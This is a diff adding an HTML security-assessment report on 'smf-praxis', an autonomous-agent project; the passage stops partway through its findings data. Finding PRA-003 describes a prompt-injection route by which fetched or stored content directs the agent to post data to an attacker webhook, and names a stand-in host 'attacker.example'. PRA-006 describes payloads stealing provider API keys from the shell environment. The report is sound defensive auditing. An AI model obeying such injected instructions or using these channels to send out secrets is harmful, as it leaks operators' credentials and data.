@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Praxis — Static Security Assessment</title>
+<style>
+:root{
+  --bg:#141210; --bg2:#181512; --panel:#1d1a15; --panel2:#232019; --line:#332d23; --line2:#453c2e;
+  --ink:#eae3d2; --mut:#a39881; --faint:#6f6754;
+  --crit:#e5484d; --high:#e07c3f; --med:#d9a53a; --low:#6fa39a; --info:#8b8371; --ok:#7fae6a; --acc:#d9a53a;
+  --serif:"Charter","Bitstream Charter","Sitka Text","Canela",Georgia,serif;
+  --mono:"IBM Plex Mono","JetBrains Mono","Fira Code","Cascadia Mono",ui-monospace,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{background:var(--bg);color:var(--ink);font:16px/1.65 var(--serif)}
+::selection{background:#5a4a22;color:#fff}
+a{color:var(--acc);text-decoration:none}
+a:hover{text-decoration:underline}
+code,.mono{font-family:var(--mono)}
+code{font-size:.86em;background:#26221a;border:1px solid var(--line);border-radius:3px;padding:.08em .35em;color:#e3d9bf;word-break:break-word}
+
+/* ---------- layout ---------- */
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+.layout{display:grid;grid-template-columns:216px minmax(0,1fr);gap:44px;align-items:start}
+aside.nav{position:sticky;top:0;align-self:start;padding:34px 0 40px;font-family:var(--mono)}
+nav .brand{font-family:var(--serif);font-size:19px;letter-spacing:.01em;margin-bottom:6px}
+nav .sub{font-size:11px;color:var(--faint);letter-spacing:.12em;text-transform:uppercase;margin-bottom:26px}
+nav ol{list-style:none}
+nav ol a{display:flex;justify-content:space-between;align-items:baseline;gap:8px;padding:7px 10px;margin:1px -10px;
+  color:var(--mut);font-size:13px;border-left:2px solid transparent;border-radius:0 3px 3px 0;transition:all .18s}
+nav ol a .n{font-size:10px;color:var(--faint)}
+nav ol a:hover{color:var(--ink);text-decoration:none;background:#201c15}
+nav ol a.active{color:var(--ink);border-left-color:var(--acc);background:#221d15}
+nav .live{margin-top:22px;padding:12px 12px 14px;border:1px solid var(--line);border-radius:6px;font-size:11px;color:var(--mut)}
+nav .live b{display:block;color:var(--ink);font-size:15px;font-weight:600;margin-bottom:2px}
+main{min-width:0;padding:34px 0 90px}
+
+/* ---------- hero ---------- */
+.hero{padding:52px 0 34px;border-bottom:1px solid var(--line);position:relative;overflow:hidden}
+.hero .rule{position:absolute;left:0;right:0;top:0;height:2px;background:linear-gradient(90deg,var(--crit),var(--high),var(--med),transparent 78%)}
+.hero .kicker{font-family:var(--mono);font-size:11px;letter-spacing:.22em;text-transform:uppercase;color:var(--mut)}
+.hero h1{font-size:clamp(30px,4.4vw,46px);font-weight:600;line-height:1.12;margin:12px 0 6px;letter-spacing:-.01em}
+.hero h1 em{font-style:italic;color:var(--acc)}
+.hero .target{font-family:var(--mono);font-size:13px;color:var(--mut)}
+.hero .meta{display:flex;flex-wrap:wrap;gap:10px 26px;margin-top:22px;font-family:var(--mono);font-size:11.5px;color:var(--faint)}
+.hero .meta span b{color:var(--mut);font-weight:500}
+.scanline{position:absolute;left:0;bottom:0;height:1px;width:180px;background:linear-gradient(90deg,transparent,var(--acc),transparent);animation:scan 2.6s ease-in-out .3s 2 both;opacity:0}
+@keyframes scan{0%{transform:translateX(-200px);opacity:0}15%{opacity:.9}100%{transform:translateX(1150px);opacity:0}}
+
+section{padding:44px 0 8px}
+h2.sec{font-size:26px;font-weight:600;letter-spacing:-.01em;margin-bottom:4px}
+h2.sec .idx{font-family:var(--mono);font-size:12px;color:var(--faint);display:block;margin-bottom:8px;letter-spacing:.18em}
+.sec-lede{color:var(--mut);max-width:70ch;margin-bottom:24px;font-size:15px}
+
+/* ---------- summary ---------- */
+.scoregrid{display:grid;grid-template-columns:230px 1fr;gap:30px;align-items:stretch;margin-bottom:30px}
+.scorebox{border:1px solid var(--line2);border-radius:10px;background:radial-gradient(120% 120% at 20% 0%,#262117,#1a1712);padding:24px 22px;text-align:left;position:relative}
+.scorebox .lbl{font-family:var(--mono);font-size:10.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--mut)}
+.scorebox .num{font-family:var(--serif);font-size:76px;font-weight:600;line-height:1;color:var(--med);margin:10px 0 2px}
+.scorebox .num small{font-size:26px;color:var(--faint);font-weight:400}
+.scorebox .verdict{font-family:var(--mono);font-size:13px;color:var(--med)}
+.scorebox .verdict::before{content:"";display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--med);margin-right:8px;vertical-align:1px;animation:pulse 2.4s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(217,165,58,.4)}55%{box-shadow:0 0 0 7px rgba(217,165,58,0)}}
+.dist{display:flex;flex-direction:column;gap:14px;justify-content:center}
+.sevbar{display:flex;height:38px;border-radius:7px;overflow:hidden;border:1px solid var(--line)}
+.sevbar .seg{display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;color:#14110c;font-weight:600;
+  width:0;transition:width 1s cubic-bezier(.2,.7,.2,1);cursor:pointer}
+.sevbar .seg:hover{filter:brightness(1.15)}
+.sevbar .seg.empty{width:14px !important;cursor:default;background:#221e17}
+.sevbar .seg.empty:hover{filter:none}
+.sevrow{display:flex;flex-wrap:wrap;gap:8px 22px;font-family:var(--mono);font-size:11.5px;color:var(--mut)}
+.sevrow .dot{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:7px;vertical-align:-1px}
+.cols{display:grid;grid-template-columns:1.35fr 1fr;gap:34px}
+.panel{border:1px solid var(--line);border-radius:9px;background:var(--panel);padding:20px 22px}
+.panel h3{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--mut);margin-bottom:14px;font-weight:600}
+.rec-list{list-style:none;counter-reset:rec}
+.rec-list li{counter-increment:rec;padding:11px 0 11px 44px;position:relative;border-bottom:1px solid var(--line);font-size:14.5px;color:#d9d0bc}
+.rec-list li:last-child{border-bottom:0}
+.rec-list li::before{content:counter(rec,decimal-leading-zero);position:absolute;left:0;top:12px;font-family:var(--mono);font-size:13px;color:var(--acc)}
+.scope li{padding:7px 0 7px 20px;position:relative;font-size:13.5px;color:var(--mut);list-style:none;border-bottom:1px dashed #2a2519}
+.scope li:last-child{border-bottom:0}
+.scope li::before{content:"";position:absolute;left:2px;top:15px;width:7px;height:7px;border:1px solid var(--faint);border-radius:1px}
+.scope li.good::before{background:var(--ok);border-color:var(--ok)}
+
+/* ---------- findings ---------- */
+.filters{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:8px}
+.chip{font-family:var(--mono);font-size:11.5px;padding:6px 12px;border-radius:20px;border:1px solid var(--line2);
+  background:var(--panel);color:var(--mut);cursor:pointer;transition:all .15s;user-select:none}
+.chip:hover{border-color:var(--faint);color:var(--ink)}
+.chip.on{color:#14110c;font-weight:600}
+.chip .c{opacity:.75;margin-left:5px}
+.search{flex:1;min-width:200px;max-width:340px;margin-left:auto;display:flex;align-items:center;gap:8px;
+  border:1px solid var(--line2);border-radius:7px;background:var(--panel);padding:7px 12px}
+.search input{flex:1;background:none;border:0;outline:0;color:var(--ink);font-family:var(--mono);font-size:12.5px}
+.search input::placeholder{color:var(--faint)}
+.search svg{flex:none;opacity:.5}
+.xfilter{display:none;align-items:center;gap:10px;margin:10px 0 0;padding:8px 14px;border:1px dashed var(--acc);border-radius:7px;
+  font-family:var(--mono);font-size:12px;color:var(--acc);background:#231d10}
+.xfilter.on{display:flex}
+.xfilter button{margin-left:auto;background:none;border:1px solid var(--acc);color:var(--acc);border-radius:5px;padding:3px 10px;
+  font-family:var(--mono);font-size:11px;cursor:pointer}
+.xfilter button:hover{background:var(--acc);color:#14110c}
+.ledger{margin-top:20px;border-top:1px solid var(--line)}
+.finding{border-bottom:1px solid var(--line);position:relative}
+.finding::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--sevc)}
+.f-head{display:grid;grid-template-columns:86px minmax(0,1fr) auto;gap:16px;align-items:baseline;width:100%;
+  text-align:left;background:none;border:0;color:inherit;cursor:pointer;padding:18px 10px 18px 26px;transition:background .15s}
+.f-head:hover{background:#1f1b14}
+.f-id{font-family:var(--mono);font-size:12px;color:var(--faint)}
+.f-id b{display:block;font-size:11px;color:var(--sevc);letter-spacing:.1em}
+.f-title{font-size:17px;font-weight:600;letter-spacing:-.005em;line-height:1.35}
+.f-sub{font-family:var(--mono);font-size:11px;color:var(--mut);margin-top:5px;display:flex;flex-wrap:wrap;gap:6px 16px}
+.f-sub .loc{color:var(--faint)}
+.f-right{display:flex;align-items:center;gap:14px}
+.f-chev{transition:transform .25s;opacity:.55}
+.finding.open .f-chev{transform:rotate(90deg)}
+.acc-body{display:grid;grid-template-rows:0fr;transition:grid-template-rows .32s cubic-bezier(.25,.8,.3,1)}
+.finding.open .acc-body{grid-template-rows:1fr}
+.acc-in{overflow:hidden}
+.f-body{padding:4px 28px 26px;display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.f-body h4{font-family:var(--mono);font-size:10.5px;letter-spacing:.18em;text-transform:uppercase;color:var(--faint);margin:0 0 8px}
+.f-body p{font-size:14px;color:#cfc6b0;margin-bottom:14px}
+.f-body .full{grid-column:1/-1}
+.sev-badge{font-family:var(--mono);font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;padding:4px 10px;border-radius:4px;
+  background:color-mix(in srgb,var(--sevc) 16%,transparent);border:1px solid color-mix(in srgb,var(--sevc) 55%,transparent);color:var(--sevc);white-space:nowrap}
+.cwe{display:inline-block;font-family:var(--mono);font-size:10.5px;color:var(--faint);border:1px solid var(--line);border-radius:3px;padding:1px 7px;margin-right:6px}
+pre.ev{background:#12100c;border:1px solid var(--line);border-left:2px solid var(--sevc);border-radius:5px;
+  padding:12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12px;line-height:1.6;color:#cfc4a8;margin-bottom:14px}
+.com{color:#7d7460;font-style:italic}.str{color:#b8a86a}.kw{color:#d98f5a}
+.empty{padding:60px 20px;text-align:center;color:var(--faint);font-family:var(--mono);font-size:13px}
+
+/* ---------- graph ---------- */
+.graphwrap{display:grid;grid-template-columns:minmax(0,1fr) 290px;gap:20px;align-items:stretch}
+.graphbox{position:relative;border:1px solid var(--line);border-radius:10px;background:
+  radial-gradient(70% 70% at 50% 42%,#1c1811,#141210);overflow:hidden;min-height:540px}
+.graphbox svg{display:block;width:100%;height:560px;cursor:grab;touch-action:none}
+.graphbox svg.panning{cursor:grabbing}
+.gnode{cursor:pointer}
+.gnode text{font-family:var(--mono);font-size:10.5px;fill:var(--mut);pointer-events:none}
+.gnode:hover text,.gnode.sel text{fill:var(--ink)}
+.gctl{position:absolute;top:12px;left:12px;display:flex;gap:6px}
+.gctl button{width:30px;height:30px;border-radius:6px;border:1px solid var(--line2);background:#1f1b14dd;color:var(--mut);
+  cursor:pointer;font-family:var(--mono);font-size:14px;line-height:1;transition:all .15s}
+.gctl button:hover{color:var(--ink);border-color:var(--faint)}
+.glegend{position:absolute;bottom:12px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--faint);display:flex;gap:16px}
+.glegend i{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px;vertical-align:-1px}
+.gdetail{border:1px solid var(--line);border-radius:10px;background:var(--panel);padding:20px;display:flex;flex-direction:column}
+.gdetail .pkg{font-family:var(--mono);font-size:16px;color:var(--ink);word-break:break-all}
+.gdetail .cons{font-family:var(--mono);font-size:11.5px;color:var(--acc);margin:8px 0 14px;word-break:break-all}
+.gdetail p{font-size:13.5px;color:var(--mut);line-height:1.6}
+.gdetail .risknote{margin-top:14px;padding:10px 12px;border-radius:6px;font-size:12.5px;font-family:var(--mono);
+  background:#241d11;border:1px solid #4d3f1e;color:var(--med);display:none}
+.gdetail .risknote.show{display:block}
+.gdetail .hint{margin-top:auto;padding-top:18px;font-family:var(--mono);font-size:10.5px;color:var(--faint)}
+
+/* ---------- heatmap ---------- */
+.hmwrap{border:1px solid var(--line);border-radius:10px;background:var(--panel);padding:26px 24px 20px;overflow-x:auto}
+.hm{display:grid;grid-template-columns:150px repeat(8,minmax(74px,1fr));gap:3px;min-width:760px}
+.hm .h{font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint);
+  display:flex;align-items:flex-end;justify-content:center;padding-bottom:8px;text-align:center;line-height:1.3}
+.hm .rl{font-family:var(--mono);font-size:11.5px;color:var(--mut);display:flex;align-items:center;justify-content:flex-end;
+  padding-right:12px;border-bottom:1px solid #262117}
+.hm .rl.hl{color:var(--acc)}
+.cell{aspect-ratio:1.55;border-radius:4px;display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:12px;cursor:pointer;transition:transform .12s,outline-color .12s;outline:1px solid transparent;
+  border-bottom:1px solid #262117;position:relative}
+.cell[data-v="0"]{background:#1a1712;color:#4b4536;cursor:default}
+.cell:hover{transform:scale(1.08);outline-color:var(--ink);z-index:2}
+.cell[data-v="0"]:hover{transform:none;outline-color:transparent}
+.hmfoot{margin-top:18px;font-family:var(--mono);font-size:11px;color:var(--faint);display:flex;gap:20px;flex-wrap:wrap;align-items:center}
+.hmfoot .sw{display:inline-block;width:22px;height:11px;border-radius:3px;margin-right:7px;vertical-align:-1px}
+#tooltip{position:fixed;z-index:50;pointer-events:none;background:#0f0d09f2;border:1px solid var(--line2);border-radius:6px;
+  padding:9px 12px;font-family:var(--mono);font-size:11.5px;color:var(--ink);max-width:320px;display:none;line-height:1.55}
+#tooltip .t{color:var(--faint);font-size:10.5px;margin-bottom:3px}
+
+/* ---------- diffs ---------- */
+.diff{border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:26px;background:#15120d}
+.diff-h{display:flex;flex-wrap:wrap;align-items:baseline;gap:14px;padding:15px 20px;background:var(--panel);border-bottom:1px solid var(--line)}
+.diff-h .fn{font-family:var(--mono);font-size:13px;color:var(--acc)}
+.diff-h .ttl{font-size:16px;font-weight:600}
+.diff-h .refs{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--faint)}
+.diff pre{overflow-x:auto;font-family:var(--mono);font-size:12.3px;line-height:1.65;padding:14px 0}
+.diff .dl{display:flex;white-space:pre;min-width:max-content;padding:0 18px 0 0}
+.diff .dl .m{width:46px;flex:none;text-align:center;color:var(--faint);user-select:none;border-right:1px solid #262015;margin-right:12px}
+.diff .dl.del{background:#2b1613}
+.diff .dl.del .m{color:var(--crit)}
+.diff .dl.add{background:#152318}
+.diff .dl.add .m{color:var(--ok)}
+.diff .note{padding:12px 20px;font-size:13.5px;color:var(--mut);border-top:1px solid var(--line);background:#181510}
+
+footer{border-top:1px solid var(--line);margin-top:60px;padding:30px 0 50px;font-family:var(--mono);font-size:11.5px;color:var(--faint);display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap}
+
+@media (max-width:980px){
+  .layout{grid-template-columns:1fr;gap:0}
+  aside.nav{position:sticky;top:0;z-index:20;background:var(--bg);border-bottom:1px solid var(--line);padding:12px 0;display:flex;gap:4px;overflow-x:auto;scrollbar-width:none}
+  aside.nav::-webkit-scrollbar{display:none}
+  nav .brand,nav .sub,nav .live{display:none}
+  nav ol{display:flex;gap:2px}
+  nav ol a{margin:0;padding:8px 12px;border-left:0;border-radius:6px;white-space:nowrap}
+  nav ol a .n{display:none}
+  .cols,.scoregrid,.f-body,.graphwrap{grid-template-columns:1fr}
+  main{padding-top:8px}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+@media print{
+  :root{--bg:#fff;--panel:#fff;--panel2:#f6f4ef;--line:#d8d3c6;--line2:#c9c3b4;--ink:#191510;--mut:#5c564a;--faint:#8a8375;--serif:Georgia,serif}
+  body{background:#fff;font-size:12px}
+  aside.nav,.gctl,.filters,.xfilter,.glegend,#tooltip{display:none!important}
+  .layout{display:block}
+  .finding .acc-body{grid-template-rows:1fr!important}
+  .finding{break-inside:avoid}
+  .graphbox,.hmwrap,.panel,.diff{border-color:#bbb}
+  .graphbox{background:#fff;min-height:0}
+  .graphbox svg{height:420px}
+  section{padding:18px 0}
+  .hero{padding:20px 0}
+  .scanline{display:none}
+}
+</style>
+</head>
+<body>
+
+<div id="tooltip" role="tooltip"></div>
+
+<div class="wrap">
+<div class="layout">
+
+<aside class="nav">
+  <nav>
+    <div class="brand">Praxis<span style="color:var(--acc)">.</span>audit</div>
+    <div class="sub">security assessment</div>
+    <ol id="navlist">
+      <li><a href="#summary">Summary <span class="n">01</span></a></li>
+      <li><a href="#findings">Findings <span class="n">02</span></a></li>
+      <li><a href="#graph">Dependencies <span class="n">03</span></a></li>
+      <li><a href="#heatmap">Risk Heatmap <span class="n">04</span></a></li>
+      <li><a href="#fixes">Remediation <span class="n">05</span></a></li>
+    </ol>
+    <div class="live">Showing <b id="liveCount">19 / 19</b> findings</div>
+  </nav>
+</aside>
+
+<main>
+
+<!-- ================= HERO ================= -->
+<div class="hero">
+  <div class="rule"></div><div class="scanline"></div>
+  <div class="kicker">Static Application Security Assessment</div>
+  <h1>smf-praxis — a governed agent,<br><em>audited at the seams</em></h1>
+  <div class="target">smfworks/smf-praxis · Python 3.10+ · dependency-free core · container runtime</div>
+  <div class="meta">
+    <span><b>Method</b> static, manual source review</span>
+    <span><b>Modules covered</b> 11 primary files</span>
+    <span><b>Findings</b> 19 (0 critical · 3 high · 6 medium · 6 low · 4 info)</span>
+    <span><b>Classification</b> CWE-mapped</span>
+  </div>
+</div>
+
+<!-- ================= 01 SUMMARY ================= -->
+<section id="summary">
+  <h2 class="sec"><span class="idx">SECTION 01</span>Executive Summary</h2>
+  <p class="sec-lede">Praxis shows unusually strong security <em>design intent</em> for an autonomous-agent project — a governance broker, approval queues, a durable kill-switch, path-traversal defenses and a pluggable sandbox. The residual risk concentrates at its <strong>network perimeter</strong>: an HTTP-only control plane whose authentication guards only mutating routes, unvalidated outbound egress, and several fail-open downgrades in the sandbox layer.</p>
+
+  <div class="scoregrid">
+    <div class="scorebox">
+      <div class="lbl">Composite risk score</div>
+      <div class="num"><span id="scoreNum">0</span><small>/100</small></div>
+      <div class="verdict">ELEVATED</div>
+    </div>
+    <div class="dist">
+      <div class="sevbar" id="sevbar"></div>
+      <div class="sevrow" id="sevrow"></div>
+    </div>
+  </div>
+
+  <div class="cols">
+    <div class="panel">
+      <h3>Priority recommendations</h3>
+      <ol class="rec-list">
+        <li>Require the auth token on <strong>every</strong> API route — including reads — whenever the daemon binds beyond loopback, and ship TLS (or mandate an authenticating reverse proxy) before any non-loopback deployment.</li>
+        <li>Add an egress guard: validate scheme (<code>https</code>) and block private/loopback/link-local IP literals in <code>gateways._post_json</code>, <code>fetch_url</code> and the search backends; today a crafted webhook target is a ready-made SSRF and exfiltration channel.</li>
+        <li>Make sandbox backend selection fail-closed: a requested <code>ssh</code>/<code>docker</code> backend that is unavailable or misconfigured must error, not silently downgrade to <code>local</code>.</li>
+        <li>Scrub the environment passed to local sandbox execution — the current <code>{**os.environ, …}</code> hands every provider API key to any approved shell command.</li>
+        <li>Restrict <code>praxis.json</code> to <code>0600</code> after the auth token is minted into it, and add failed-attempt throttling to token verification.</li>
+      </ol>
+    </div>
+    <div class="panel">
+      <h3>Scope, strengths &amp; limitations</h3>
+      <ul class="scope">
+        <li class="good">Durable, store-backed kill-switch survives daemon restarts</li>
+        <li class="good">Cross-platform path-traversal defense in <code>real_tools._resolve</code></li>
+        <li class="good">Upload size caps, SSE queue bounds, idempotency-receipt limits</li>
+        <li class="good">Non-root container (uid 10001), read-only rootfs sandbox, dropped caps</li>
+        <li>Dashboard HTML (~6,100 lines) and 6 modules were truncated — dynamic testing of the SPA (XSS, CSP) is still required</li>
+        <li>Mock M365 tools reviewed for risk misclassification only</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 02 FINDINGS ================= -->
+<section id="findings">
+  <h2 class="sec"><span class="idx">SECTION 02</span>Findings Ledger</h2>
+  <p class="sec-lede">Ranked by severity, each with file-level evidence and a concrete fix. Filter by severity, search by text, or click a heatmap cell in Section 04 to cross-filter by module and category.</p>
+
+  <div class="filters" id="sevChips"></div>
+  <div class="xfilter" id="xfilter">
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M3 3l18 18M21 3L3 21"/></svg>
+    <span id="xfilterText"></span>
+    <button id="xclear" type="button">clear</button>
+  </div>
+  <div class="ledger" id="ledger"></div>
+</section>
+
+<!-- ================= 03 GRAPH ================= -->
+<section id="graph">
+  <h2 class="sec"><span class="idx">SECTION 03</span>Dependency &amp; Supply-Chain Graph</h2>
+  <p class="sec-lede">The core installs nothing — its real attack surface is optional extras. Drag nodes, scroll to zoom, drag the canvas to pan, click a node for its constraint and risk notes. Amber-ringed nodes carry elevated supply-chain risk.</p>
+  <div class="graphwrap">
+    <div class="graphbox" id="graphbox">
+      <svg id="gsvg" aria-label="dependency graph"></svg>
+      <div class="gctl">
+        <button id="gzin" title="Zoom in" aria-label="Zoom in">+</button>
+        <button id="gzout" title="Zoom out" aria-label="Zoom out">−</button>
+        <button id="greset" title="Reset view" aria-label="Reset view">⟲</button>
+      </div>
+      <div class="glegend">
+        <span><i style="background:var(--ok)"></i>core (stdlib-only)</span>
+        <span><i style="background:#5c5342"></i>optional extra</span>
+        <span><i style="background:var(--med)"></i>elevated supply-chain risk</span>
+      </div>
+    </div>
+    <div class="gdetail" id="gdetail">
+      <div class="pkg" id="gdName">Select a node</div>
+      <div class="cons" id="gdCons"></div>
+      <p id="gdNote">Click any node in the graph to inspect its version constraint, why it is pulled in, and any supply-chain observations.</p>
+      <div class="risknote" id="gdRisk"></div>
+      <div class="hint">wheel · drag / wheel-zoom / click</div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 04 HEATMAP ================= -->
+<section id="heatmap">
+  <h2 class="sec"><span class="idx">SECTION 04</span>Risk Heatmap</h2>
+  <p class="sec-lede">Risk concentration by module and vulnerability category. Intensity reflects the highest-severity finding mapped to that cell. Click any populated cell to jump to the matching findings; hover for detail.</p>
+  <div class="hmwrap"><div class="hm" id="hm"></div></div>
+  <div class="hmfoot">
+    <span><span class="sw" style="background:#e5484d"></span>high (3)</span>
+    <span><span class="sw" style="background:#e07c3f;opacity:.75"></span>medium (2)</span>
+    <span><span class="sw" style="background:#d9a53a;opacity:.4"></span>low (1)</span>
+    <span><span class="sw" style="background:#7fae6a"></span>verified control (✓)</span>
+    <span style="margin-left:auto">click cell → filters Section 02</span>
+  </div>
+</section>
+
+<!-- ================= 05 FIXES ================= -->
+<section id="fixes">
+  <h2 class="sec"><span class="idx">SECTION 05</span>Recommended Fixes</h2>
+  <p class="sec-lede">Minimal, drop-in patches against the reviewed sources. Red lines are removed, green lines are added. Each diff references its finding IDs.</p>
+  <div id="diffs"></div>
+</section>
+
+<footer>
+  <span>smfworks/smf-praxis · static security assessment</span>
+  <span>19 findings · 0 critical · 3 high · 6 medium · 6 low · 4 informational</span>
+</footer>
+
+</main>
+</div>
+</div>
+
+<script>
+"use strict";
+/* ============================ DATA ============================ */
+const CATS = ["AuthN","AuthZ","Injection","SSRF/Net","Secrets","Sandbox","Supply Chain","Config"];
+
+const FINDINGS = [
+ {id:"PRA-001",sev:"high",cat:"AuthZ",cwe:"CWE-306",files:["daemon.py","auth_gate.py","Dockerfile"],
+  title:"Authentication guards mutating routes only — read endpoints expose knowledge base, tasks and audit trail",
+  syn:"The auth gate's own contract is that only mutating API calls require the shared token. Every GET route (knowledge base, pending approvals, task history, audit log, daemon state) answers unauthenticated whenever the daemon is reachable. The Dockerfile then sets PRAXIS_HOST=0.0.0.0 by default, so inside any non-compose deployment the entire data plane is open.",
+  ev:'# auth_gate.py — module docstring\n"When the daemon is reachable beyond loopback, mutating API calls require a\n shared token (PRAXIS_AUTH_TOKEN env, or agents.auth.token in config)."\n\n# Dockerfile\nENV PRAXIS_HOME=/data \\\n    PRAXIS_HOST=0.0.0.0 \\\n# docker-compose.yml mitigates for the default path only:\nports:\n  - "127.0.0.1:8643:8643"',
+  risk:"An attacker with any network route to the port (mis-mapped container, port-forward, LAN bind, SSRF from a co-tenant) can read the full knowledge base, task contents, approval previews and the audit trail — a complete confidentiality breach of everything Praxis has ingested, with zero credentials.",
+  fix:"Gate every /api/ route (reads included) on token_matches() when auth_required(bind_host) is true; change the image default to PRAXIS_HOST=127.0.0.1 and require an explicit override for non-loopback binds. See diff F-01/F-05."},
+
+ {id:"PRA-002",sev:"high",cat:"SSRF/Net",cwe:"CWE-319",files:["daemon.py","auth_gate.py"],
+  title:"No TLS anywhere — bearer token and dashboard traffic travel in cleartext",
+  syn:"The daemon is a plain http.server; auth_gate actively supports non-loopback binds with bearer authentication, but nothing negotiates TLS. The token minted for remote access is then transmitted unencrypted on every request.",
+  ev:'# auth_gate.py — non-loopback use is an intended, supported posture\ndef auth_required(bind_host: str) -> bool:\n    "True when the bind address is not loopback-only."\n    ...\n    return True  # 0.0.0.0 / :: / LAN IPs require auth\n\n# daemon.py — stdlib HTTP server, no TLS wrapper\nfrom http.server import BaseHTTPRequestHandler, ThreadingHTTPServer',
+  risk:"On any non-loopback network the shared token — the single credential protecting mutations — is sniffable, and session tokens in transit can be replayed indefinitely (no expiry, no rotation). Dashboard content and API payloads leak alongside it.",
+  fix:"Either terminate TLS in front of the daemon (documented reverse-proxy requirement with HSTS) or support TLS via ssl.SSLContext in ThreadingHTTPServer. Refuse token-authenticated non-loopback binds when the connection is not TLS."},
+
+ {id:"PRA-003",sev:"high",cat:"SSRF/Net",cwe:"CWE-918",files:["gateways.py","real_tools.py","search.py"],
+  title:"Unvalidated outbound URLs — SSRF and a prompt-injection exfiltration channel",
+  syn:"Gateway destinations accept arbitrary URLs (discord/webhook targets can be overridden per-call via '<channel>:<url>'), the generic webhook channel POSTs to any configured or overridden URL, and outbound fetches go through urllib, which happily services file:// and private addresses. No scheme allowlist, no private-IP filtering anywhere in the reviewed egress paths.",
+  ev:'# gateways.py — destination overrides the URL, unvalidated\ndef _send_webhook(cfg_block, text, dest):\n    url = _expand_env(dest or cfg_block.get("url", ""))\n    ...\n    status, _ = _post_json(url, {field: text})\n\n# target syntax lets the agent choose the URL at send time:\n# "discord:https://attacker.example/incoming" + urllib has no scheme guard',
+  risk:"Content that reached the knowledge base or a fetched page can instruct the agent to deliver data to an attacker-controlled webhook — a direct exfiltration primitive that bypasses the read/draft risk model (gateway delivery is outbound messaging, not gated as a file read). The same primitive is classic SSRF: POST probes against internal services and cloud metadata endpoints.",
+  fix:"Add a shared _assert_safe_url() (https-only, IP-literal filtering for private/loopback/link-local ranges, hostname allowlist option) and call it in _post_json, _send_ntfy, fetch_url and the search endpoint resolver. See diff F-02."},
+
+ {id:"PRA-004",sev:"medium",cat:"Secrets",cwe:"CWE-312",files:["auth_gate.py","config.py"],
+  title:"Minted auth token persisted to praxis.json without permission restriction",
+  syn:"ensure_token() writes the session token through cfg.save_config(), which never calls secure_file() — unlike the API-key path (_write_file_key), which does. Under a default umask 022 the token file lands world-readable at 0644.",
+  ev:'# auth_gate.py\n    auth["token"] = token\n    auth["minted"] = True\n    cfg.save_config(conf)   # <-- save_config() does no chmod / icacls\n\n# config.py — compare the key path, which IS restricted:\ndef _write_file_key(provider_id, api_key):\n    ...\n    auth_path().write_text(json.dumps(auth, indent=2), ...)\n    secure_file(auth_path())   # only applied here',
+  risk:"Any local user or process (and any container break-out that keeps the /data mount) can read the live authentication token from praxis.json and exercise full authenticated API access, including approval of SEND/DESTRUCTIVE actions.",
+  fix:"Call secure_file() on the config path after minting, and refuse to enable non-loopback auth if the restriction fails. See diff F-01."},
+
+ {id:"PRA-005",sev:"medium",cat:"Sandbox",cwe:"CWE-470",files:["sandbox.py"],
+  title:"Sandbox backend selection fails open — silent downgrades to 'local'",
+  syn:"select_backend() downgrades to the weakest backend (local, host shell) with only a log warning in several paths: ssh/modal/daytona requested but unconfigured, Docker requested but unavailable when allow_local_fallback is true (the default), and docker-on-Windows.",
+  ev:'# sandbox.py\nif choice == "ssh":\n    if block.get("ssh_host"):\n        return "ssh"\n    _log.warning("... unset; falling back to \'local\'")\n    return "local"      # operator asked for isolation, got the host shell\n...\nif block.get("allow_local_fallback"):   # default True\n    _log.warning("sandbox backend \'docker\' requested but Docker is "\n                 "unavailable; allow_local_fallback=true -> \'local\'")\n    return "local"',
+  risk:"An operator who explicitly configured a stronger isolation backend silently loses it after a Docker outage, a config typo, or a Windows host — exactly when they assumed confinement. Shell execution is the highest-blast-radius tool in the registry.",
+  fix:"Invert the default: a backend that was explicitly requested but unavailable must return an error from run() (fail-closed), with local fallback only on an explicit opt-in. See diff F-04."},
+
+ {id:"PRA-006",sev:"medium",cat:"Secrets",cwe:"CWE-200",files:["sandbox.py"],
+  title:"Local sandbox executes commands with the entire host environment — every provider key exposed",
+  syn:"_run_local() spawns the command with env={**os.environ, **(env or {})}. All provider API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY, …), PRAXIS_AUTH_TOKEN if exported, and anything else in the daemon's environment are directly readable by the executed payload.",
+  ev:'# sandbox.py\ndef _run_local(command, workdir, timeout, env):\n    use_shell = isinstance(command, str)  # also: shell=True for strings\n    proc = subprocess.run(\n        command, cwd=workdir, capture_output=True, text=True,\n        timeout=timeout, env={**os.environ, **(env or {})}, check=False,\n        shell=use_shell)',
+  risk:"One approved run_shell call (or one social-engineered approval) is enough for a payload to exfiltrate every configured credential — the approval preview shows the command, but operators approve commands, not environment dumps. Combined with PRA-003's unvalidated egress, this is a complete secret-stealing chain.",
